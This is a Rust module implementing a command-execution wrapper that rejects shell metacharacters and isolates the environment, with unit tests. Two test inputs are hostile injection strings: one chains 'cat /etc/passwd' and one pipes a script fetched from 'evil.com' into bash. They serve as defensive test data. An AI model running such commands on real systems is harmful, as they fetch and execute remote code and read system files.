use std::process::Command;
use crate::{ValidationError, monitoring};

/// Safe command execution that prevents injection attacks
pub struct SafeCommand {
    program: String,
    args: Vec<String>,
    env_whitelist: Vec<String>,
}

impl SafeCommand {
    pub fn new(program: impl Into<String>) -> Self {
        Self {
            program: program.into(),
            args: Vec::new(),
            env_whitelist: vec![
                "PATH".to_string(),
                "HOME".to_string(),
                "USER".to_string(),
            ],
        }
    }
    
    pub fn arg(&mut self, arg: impl Into<String>) -> &mut Self {
        let arg = arg.into();
        
        // Validate argument doesn't contain shell metacharacters
        if self.contains_shell_metacharacters(&arg) {
            monitoring::log_security_event(monitoring::SecurityEvent::CommandInjectionAttempt {
                command: self.program.clone(),
                arg: arg.clone(),
            });
            // Store it anyway but it will be rejected on execute
        }
        
        self.args.push(arg);
        self
    }
    
    pub fn args<I, S>(&mut self, args: I) -> &mut Self 
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        for arg in args {
            self.arg(arg);
        }
        self
    }
    
    pub fn execute(&self) -> Result<std::process::Output, ValidationError> {
        // Final validation before execution
        for arg in &self.args {
            if self.contains_shell_metacharacters(arg) {
                return Err(ValidationError::CommandInjection);
            }
        }
        
        // Validate program path
        if self.contains_shell_metacharacters(&self.program) {
            return Err(ValidationError::CommandInjection);
        }
        
        let mut cmd = Command::new(&self.program);
        
        // Add arguments safely - each as a separate argument, not concatenated
        for arg in &self.args {
            cmd.arg(arg);
        }
        
        // Clear environment and only allow whitelisted variables
        cmd.env_clear();
        for var in &self.env_whitelist {
            if let Ok(value) = std::env::var(var) {
                cmd.env(var, value);
            }
        }
        
        // Execute with timeout
        match cmd.output() {
            Ok(output) => Ok(output),
            Err(e) => Err(ValidationError::Other(format!("Command execution failed: {}", e))),
        }
    }
    
    fn contains_shell_metacharacters(&self, s: &str) -> bool {
        // Common shell metacharacters that could be used for injection
        const DANGEROUS_CHARS: &[char] = &[
            ';', '|', '&', '$', '`', '(', ')', '{', '}', 
            '<', '>', '\\', '\n', '\r', '\0', '*', '?', 
            '[', ']', '!', '~', '"', '\'',
        ];
        
        // Check for dangerous patterns
        if s.contains("$(") || s.contains("${") || s.contains("<!") {
            return true;
        }
        
        // Check individual characters
        s.chars().any(|c| DANGEROUS_CHARS.contains(&c))
    }
    
    /// Create a safe command for common file operations
    pub fn file_operation(operation: &str, file_path: &std::path::Path) -> Result<Self, ValidationError> {
        // Validate the file path first
        let path_validator = crate::path::PathValidator::default();
        let safe_path = path_validator.validate_and_normalize(file_path.to_str().unwrap_or(""))?;
        
        let mut cmd = match operation {
            "read" => SafeCommand::new("cat"),
            "copy" => SafeCommand::new("cp"),
            "move" => SafeCommand::new("mv"),
            "delete" => SafeCommand::new("rm"),
            _ => return Err(ValidationError::Other(format!("Unknown operation: {}", operation))),
        };
        
        cmd.arg(safe_path.to_string_lossy().to_string());
        Ok(cmd)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_command_injection_prevention() {
        let mut cmd = SafeCommand::new("echo");
        cmd.arg("safe argument");
        assert!(cmd.execute().is_ok());
        
        let mut cmd = SafeCommand::new("echo");
        cmd.arg("dangerous; cat /etc/passwd");
        assert!(cmd.execute().is_err());
        
        let mut cmd = SafeCommand::new("echo");
        cmd.arg("$(curl evil.com/exploit.sh | bash)");
        assert!(cmd.execute().is_err());
    }
    
    #[test]
    fn test_null_byte_in_command() {
        let mut cmd = SafeCommand::new("echo");
        cmd.arg("file\0.txt");
        assert!(cmd.execute().is_err());
    }
    
    #[test] 
    fn test_environment_isolation() {
        std::env::set_var("DANGEROUS_VAR", "evil_value");
        
        let mut cmd = SafeCommand::new("printenv");
        cmd.arg("DANGEROUS_VAR");
        
        let output = cmd.execute().unwrap();
        assert!(output.stdout.is_empty()); // Variable not passed through
    }
}